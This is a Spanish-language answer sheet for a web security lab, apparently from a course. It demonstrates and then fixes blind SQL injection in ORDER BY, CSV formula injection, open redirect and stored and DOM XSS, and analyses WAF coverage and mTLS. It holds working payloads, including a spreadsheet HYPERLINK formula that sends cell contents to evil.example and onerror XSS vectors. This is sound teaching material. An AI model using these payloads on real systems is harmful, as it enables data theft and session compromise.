# Respuestas

## Etapa 1

### Cómo se explotó cada reto (resumen)

| Reto | Payload | Resultado en `/vuln` | Resultado en `/secure` | Evidencia |
|---|---|---|---|---|
| 1 · ORDER BY | `sort=(CASE WHEN (SELECT substr(password_hash,1,1) FROM users WHERE username='admin')='p' THEN id ELSE -id END)` | El orden cambia según la condición. Con `attacks/blind_order_by.py` extraje el hash completo de `admin` (`pbkdf2_sha256$demo$FAKEHASH`) en 853 requests, respetando el rate limit del gateway | `422`, la consulta no se ejecuta | `evidencia/etapa-1/reto1-*.png` |
| 2 · CSV | body `=HYPERLINK("https://evil.example/?d="&A1,"Ver detalle")` y body `uno,dos,tres⏎fila,fantasma` | Al abrir el CSV en LibreOffice Calc la celda es una fórmula que arma un link con el contenido de A1 (exfiltración); las comas y el salto inventan columnas y una fila | La celda sale como `'=HYPERLINK(...)` (texto) y cada fila tiene siempre 2 columnas | `evidencia/etapa-1/reto2-*.png`, `vuln.csv`, `secure.csv` |
| 3 · Redirect | `next=https://evil.example/login`, `next=//evil.example` | `302` con `Location` hacia `evil.example` | `302` con `Location: /`; `/secure/comments?filter=x` y `/app/#alice` se respetan | `evidencia/etapa-1/reto3-open-redirect.png` |

Un detalle que apareció probando el reto 3: con `next=/\evil.example`, `RedirectResponse` de Starlette codifica la barra invertida y devuelve `Location: /%5Cevil.example`, así que esa variante puntual no sale del sitio *por accidente del framework*. No es una defensa en la que convenga confiar (otro framework, o un `Response` armado a mano, no lo hace), por eso la versión segura la rechaza explícitamente.

### 1. Técnica principal y capa de cada reto

| Reto | Técnica | Capa | Dónde |
|---|---|---|---|
| 1 | **Validar con allowlist** (y que el fragmento SQL salga de nuestro código). No es parametrización: los identificadores no se pueden parametrizar | Frontera del servicio (tipo `Literal`, `422`) + sink SQL (diccionarios `SORT_COLUMNS`/`SORT_DIRECTIONS`) | `routes_secure.sorted_comments` |
| 2 | **Codificar en la salida**, con dos encoders para dos contextos: `csv.writer(QUOTE_ALL)` para la estructura del archivo y `spreadsheet_cell` para el contenido de la celda | Salida | `encoding.spreadsheet_cell`, `routes_secure.export_csv` |
| 3 | **Validar con allowlist** de destinos (path relativo con prefijo conocido) y fallar cerrado | Frontera del servicio | `validation.safe_redirect_target`, `routes_secure.redirect_after_login` |

### 2. Reto 1: ¿por qué no alcanza con "parametrizar todo"?

Porque el motor compila la **estructura** de la consulta antes de recibir los parámetros, y un `?` solo puede ocupar el lugar de un **valor** (un literal). `ORDER BY ?` con `"author"` ordena por la constante `'author'` (o sea, no ordena), no por la columna. Tampoco se pueden parametrizar:

- nombres de **tablas y columnas** (identificadores);
- **palabras clave**: `ASC`/`DESC`, `NULLS FIRST`, `JOIN`, `UNION`;
- **operadores** (`=`, `<`, `LIKE`) y funciones;
- en muchos motores, `LIMIT`/`OFFSET` tampoco aceptan parámetros.

Para todo eso, la única defensa sólida es una **allowlist que traduce** la opción del usuario a un fragmento escrito por nosotros: la entrada elige una clave del diccionario, nunca aporta texto a la consulta.

### 3. Reto 2: ¿encoder al guardar o al exportar?

**Al exportar.** Tres razones:

1. **Las filas viejas.** El dato peligroso puede haber entrado antes del fix o por otra vía (en la demo, por `/vuln/comments`). Si el encoder estuviera en el alta, esas filas saldrían crudas. Al exportar, se neutraliza todo lo que hay en la base, sin migraciones.
2. **El encoder depende del destino.** La comilla delante de `=` solo tiene sentido en una planilla. Guardar `'=1+1` en la base ensucia el dato para el HTML, la API JSON o cualquier otro consumidor (que mostrarían una comilla de más).
3. **Un solo lugar.** Todo lo que genere CSV pasa por el mismo encoder; no depende de que cada endpoint de alta se acuerde.

Al guardar sí corresponde **validar** (largo, caracteres de control, tipo); codificar, al salir.

### 4. Reto 3: ¿por qué redirigir a `/` y no devolver 400?

- **La víctima es el usuario legítimo**, no el atacante: llegó por un link armado por otro y ya se logueó. Un 400 le rompe el flujo y le deja una pantalla de error; mandarlo al inicio es inocuo y le permite seguir.
- **Falla cerrado igual**: el destino malicioso nunca se usa; lo único que se pierde es "volver a donde estaba", que es una comodidad.
- **No da oráculo**: con 400, el atacante puede probar variantes (`//`, `/\`, `%2F`, `%09`) y ver cuál "pasa" según el código de respuesta. Si todo lo inválido termina igual (`302 → /`), hay menos información para afinar el bypass.
- Si hace falta visibilidad, el rechazo se **loguea** del lado del servidor.

### 5. ¿Lo hubiera frenado el gateway o un WAF con OWASP CRS?

**El `nginx.conf` actual: ninguno de los tres.** Solo mira tasa, tamaño, content type y la ruta `/internal/`; los tres payloads son requests chicos, con el content type correcto, a rutas permitidas. Lo único que hizo fue *frenar* (no impedir) el reto 1: el rate limit obliga a espaciar los 853 requests de la extracción.

**Un WAF con CRS: lo probé** (bonus, ver `BONUS.md` y `evidencia/etapa-1/bonus-waf-modsecurity-crs.png`), con `owasp/modsecurity-crs:nginx-alpine`, CRS 4.30.0, paranoia 1:

| Reto | ¿Bloqueado? | Por qué |
|---|---|---|
| 1 | **Sí** (403), incluso la variante con `/**/` en lugar de espacios | El payload tiene la forma clásica de SQLi (`SELECT ... FROM`, `CASE WHEN`, comillas): coincide con las reglas 942xxx. Pero el **punto de inyección sigue abierto**: `sort=-id` u otras expresiones sin palabras clave pasan, y con paranoia 1 hay técnicas de evasión conocidas. El WAF reduce la superficie, no la cierra |
| 2 | **No** (201 al guardar, 200 al exportar) | `=HYPERLINK("https://...")` no es un ataque para HTTP: es texto válido en un comentario. El daño ocurre después, en la planilla de otra persona, en un contexto que el WAF no ve |
| 3 | **No** (302 hacia `evil.example`) | `https://evil.example/login` es un valor perfectamente normal para un parámetro de URL. Qué destinos son legítimos es una regla **del negocio de esta app**; ningún WAF genérico puede saberlo |

Conclusión: el borde sirve para cortar ruido barato y payloads de manual, pero los ataques que dependen del **contexto de salida** (CSV) o de **reglas de la aplicación** (destinos válidos) solo se resuelven en el servicio.

## Etapa 2

### Parte A — el front

#### Vulnerabilidades encontradas y explotadas

| # | Tipo | Payload | Cómo llega al navegador | Sink en `app.js` | Evidencia |
|---|---|---|---|---|---|
| 1 | **XSS almacenado** | `POST /vuln/comments` con body `Mirá esta foto <img src=x onerror="...">` (la ruta vulnerable no valida nada) | Queda en la base; `GET /secure/comments.json` lo devuelve tal cual (es una API de datos) y el front lo inserta | `body.innerHTML = c.body` | `A1-xss-almacenado-antes.png`: el `onerror` cambia el fondo y el título a "XSS ALMACENADO EJECUTADO" |
| 2 | **XSS basado en DOM** | `http://localhost:8080/app/#<img src=x onerror="...">` | Por `location.hash`: el fragmento **nunca se envía al servidor**, así que ni el gateway, ni un WAF, ni los logs lo ven. Alcanza con que la víctima abra el link | ``filterInfo.innerHTML = `Filtrando por: <b>${filter}</b>...` `` | `A2-xss-dom-antes.png` |

`<script>` no sirve en ninguno de los dos casos (HTML5 no ejecuta scripts insertados con `innerHTML`); los handlers como `onerror` sí.

Antes de poder explotarlo tuve que arreglar un bug del material: el `nginx.conf` no incluía `mime.types`, servía `app.js` como `text/plain` y, como el gateway manda `X-Content-Type-Options: nosniff`, el navegador se negaba a ejecutarlo (el front no cargaba nada).

#### Correcciones

- **Comentarios** → `DOMPurify.sanitize` con allowlist (`b`, `i`, `em`, `strong`, `p`, `br`, `ul`, `ol`, `li`, `a`, `code`; atributos `href` y `title`; URIs solo `https:` y `mailto:`), el mismo criterio que `sanitize.py` en el backend. Los links salen con `rel="noopener noreferrer nofollow"`. Si DOMPurify no cargara, el comentario se muestra como texto plano (falla cerrado). Se conservan negritas, cursivas y links (`A3-xss-almacenado-despues.png`).
- **Filtro del hash** → se construye con `createElement` + `textContent`: el payload se ve como texto (`A4-xss-dom-despues.png`). Ya no queda ningún `innerHTML` en `app.js`.
- **CSP en `/app/`** (gateway): `default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self'; font-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; object-src 'none'`. Sin `unsafe-inline` ni `unsafe-eval`; el front funciona igual porque no tiene scripts ni estilos inline. Los otros headers de seguridad se repiten dentro de la `location`, porque en nginx un `add_header` en un bloque hace que **no** se hereden los del bloque padre.

Con la CSP activa el front sigue funcionando completo: carga, filtra, publica y muestra el veredicto de moderación (`A7-front-con-csp-y-moderacion.png`, probado con Playwright).

**¿Por qué hacen falta las dos cosas?** Lo probé: con el `app.js` original (vulnerable) y la CSP activa, el `<img>` se inserta pero el `onerror` no corre, y Chrome lo reporta: *"Executing inline event handler violates the following Content Security Policy directive 'script-src 'self''"* (`A5-solo-csp-con-app-js-vulnerable.png`, `A6-validacion-form-y-csp.png`). O sea que la CSP sola frenó *este* payload, pero:

- solo frena **ejecución de scripts**: no frena HTML inyectado que haga phishing (un formulario falso, un link "Iniciá sesión de nuevo"), ni *dangling markup*, ni nada que no sea JS;
- depende de que nadie la afloje después (un `unsafe-inline` agregado por un widget de terceros la anula), y de que el navegador la soporte;
- un script del mismo origen (`'self'`) que haga algo inseguro con datos (JSONP, un archivo subido servido como JS) la saltea.

Y el fix en el código solo deja un único punto de falla: un `innerHTML` nuevo que alguien agregue mañana vuelve a abrir el agujero. Código correcto + CSP = dos capas independientes.

#### La validación del formulario no es seguridad

Con `curl` mandé lo que el formulario nunca dejaría: autor `<script>alert(1)</script>`, body de 2001 caracteres, un campo extra `is_admin`, body en blanco. El backend respondió **422** en todos los casos, por su cuenta; y un POST con `Content-Type: text/plain` lo cortó antes el gateway con **415** (`A6-validacion-form-y-csp.png`).

### Parte B — moderation-service con mTLS

- **Contrato** (sin cambios respecto del sugerido): `POST /moderate` con `{"comment_id": int ≥ 1, "author": "^[a-z0-9_]{3,20}$", "body": str 1..2000}` → `{"status": "approved" | "rejected", "reason": str ≤ 200}`. Reglas: palabras prohibidas (`spam`, `estafa`, `casino`, `phishing`) y más de 2 links.
- **Fallar cerrado**: el comentario se guarda `pending`, se pide el veredicto y solo pasa a `approved` con una respuesta válida. Si moderation no responde, tarda más de 3 s, contesta un HTTP ≠ 200, más de 4 KB o algo que no cumple el schema, queda `pending`, **no aparece en ninguna salida** y el cliente recibe `503 {"status":"pending"}`. Elegí guardarlo y no rechazarlo para no perder lo que escribió el usuario y poder reintentar o revisar; la contra es acumular pendientes, que en producción se resolvería con una cola de reintentos.
- **Rechazo**: `422 {"status":"rejected","reason": ...}`. El `reason` se trata como dato no confiable: viaja en JSON (nunca se interpola en HTML del servidor), está limitado a 200 caracteres por el schema, y el front lo muestra con `textContent`. Hay un test que manda un `reason` con `<img onerror>` y verifica que vuelve como dato JSON.
- **Tests**: `comments-service/tests/test_moderation.py` (21 casos: aprobado, rechazado, 10 respuestas inválidas —incluida `{"status":"approved","is_admin":true}`—, HTTP 500, no-JSON, respuesta enorme, timeout, caído, certificado inválido, sin configuración, y que un pendiente no aparezca en ninguna salida) y `moderation-service/tests/test_moderation.py` (24 casos). Handshakes: `attacks/mtls_tests.sh` (ver `CERTIFICADOS.md`).

### Preguntas de análisis (etapa 2)

**1. ¿Qué protege mTLS y qué no? Un ataque que no frena.**

Protege el **canal y la identidad de las puntas**: confidencialidad e integridad del tráfico entre comments y moderation (nadie en la red de Docker puede leerlo ni modificarlo), y autenticación mutua (moderation sabe que le habla alguien con un certificado de nuestra CA —y con el bonus, que es específicamente comments-service—; comments sabe que le contesta el verdadero moderation y no un impostor, como en la prueba 6).

No protege **lo que se dice por el canal**. Ataque concreto que mTLS no frena: un atacante que logra ejecución de código en comments-service (por ejemplo, por una dependencia vulnerable) usa el certificado legítimo de ese contenedor para mandarle a moderation `{"comment_id": 1, "author": "alice", "body": "<10 MB de texto>", "is_admin": true}` en loop. El handshake es perfecto; lo que lo frena es el schema de moderation (422) y, en sentido inverso, si el comprometido fuera moderation y respondiera `{"status":"approved","is_admin":true}` o un `reason` con `<script>`, lo frena la validación de respuesta de comments. Tampoco cubre bugs lógicos ni DoS (un cliente autenticado puede igual saturar al servidor).

**2. Si ya hay mTLS, ¿por qué moderation valida el request y comments la respuesta?**

Porque mTLS responde *quién* manda el mensaje, no *si el mensaje es correcto*. Un certificado válido no garantiza que el emisor no tenga un bug (una versión nueva de comments que mande `comment_id` como string), que no esté comprometido, o que no esté reenviando sin saberlo datos de un usuario malicioso: el `body` del comentario lo escribió un usuario de internet, y mTLS no lo vuelve confiable. Es **confianza cero entre servicios**: cada frontera valida lo que recibe con su propio schema, sin asumir que el otro lado cumplió su parte. Además cada lado define el contrato desde su necesidad (moderation acota lo que está dispuesto a procesar; comments acota lo que está dispuesto a creer), y una respuesta que no entiende se trata como "no hay veredicto", nunca como "aprobado".

**3. El front valida con `pattern` y `maxlength`. ¿Para qué sirve si no es seguridad?**

Para **experiencia de usuario** y para ahorrar ida y vuelta: el usuario se entera al instante de que el nombre tiene mayúsculas o que se pasó del largo, sin esperar un 422 ni perder lo escrito; y el servidor recibe menos requests inválidos. No es seguridad porque todo lo que corre en el navegador lo controla quien lo usa: con DevTools se borra el `pattern`, con `curl` ni siquiera existe el formulario. Por eso las mismas reglas están (y mandan) en el backend; las del front son una copia de cortesía.

**4. `comments.json` devuelve el HTML crudo. ¿Error del backend o del front? ¿Dónde va el encoding?**

Del **front**. Una API JSON entrega **datos**, y no sabe en qué contexto se van a usar: el mismo `body` puede ir a un `innerHTML`, a un `textContent`, a un CSV, a una app móvil o a otro servicio. Si el backend lo devolviera ya escapado para HTML, rompería a todos los demás consumidores (`&lt;b&gt;` en un CSV o en un push), y se arriesga al doble escapado. El encoding o el saneamiento corresponde **donde se genera la salida**, porque solo ahí se conoce el contexto: en el front, DOMPurify para el HTML enriquecido y `textContent` para el texto plano; en `/secure/comments` (HTML generado en el servidor), autoescape + nh3; en el CSV, `spreadsheet_cell`. Lo que sí le toca al backend es **validar** la entrada (largo, caracteres de control, schema) y mandar el JSON con `Content-Type: application/json` para que nunca se interprete como HTML.

**5. ¿Qué pasa si se filtra la clave privada de comments-service? ¿Cómo se mitiga?**

Quien la tenga puede presentarse ante moderation **como comments-service** (pasa la CA y pasa el control de identidad del bonus) mientras el certificado sea válido: puede pedir moderaciones, sondear las reglas o intentar saturarlo. No puede hacerse pasar por moderation (no tiene esa clave) ni leer tráfico pasado (TLS 1.3 con ECDHE da *forward secrecy*). Mitigaciones:

- **Vida útil corta**: los certificados del proyecto duran 30 días; con emisión automatizada (ACME interno, step-ca, cert-manager) se baja a horas y una clave robada caduca sola rápido.
- **Rotación**: emitir una clave y un certificado nuevos con la CA y reemplazarlos. En este proyecto comments-service los toma **sin reiniciar** (arma el contexto TLS en cada request; lo probé, `B4-bonus-rotacion-en-caliente.png`).
- **Revocación**: el certificado viejo sigue siendo válido hasta que vence. Para cortarlo antes: CRL u OCSP en moderation, o, más simple en un sistema chico, una denylist de seriales en el mismo control de identidad del bonus. Con vidas útiles de horas, muchas organizaciones directamente no revocan.
- **Reducir la superficie de la clave**: hoy se monta un archivo `0600` de solo lectura solo en el contenedor que la usa; en producción iría en un secret manager (Docker/Kubernetes secrets, Vault) o un HSM/TPM donde la clave no se puede exportar.
- **Detección**: loguear la identidad y el serial de cada cliente en moderation para notar usos desde lugares inesperados.
- Y la validación estricta de moderation limita lo que se puede hacer aun con el certificado.
